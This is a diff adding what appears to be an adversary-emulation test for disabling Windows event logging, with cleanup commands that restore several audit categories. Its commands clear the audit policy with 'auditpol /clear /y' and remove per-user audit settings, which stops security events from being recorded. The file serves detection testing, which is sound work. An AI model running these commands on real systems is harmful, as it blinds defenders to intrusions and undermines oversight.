@@ -1,0 +1,15 @@
+#TechniqueName: Impair Defenses: Disable Windows Event Logging
+#AtomicTestName: Clear Windows Audit Policy Config
+#Description: Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.
+#Language: cmd
+
+#commands
+auditpol /clear /y
+auditpol /remove /allusers
+
+
+#cleanup_commands
+auditpol /set /category:"Account Logon" /success:enable /failure:enable
+auditpol /set /category:"Detailed Tracking" /success:enable
+auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
+
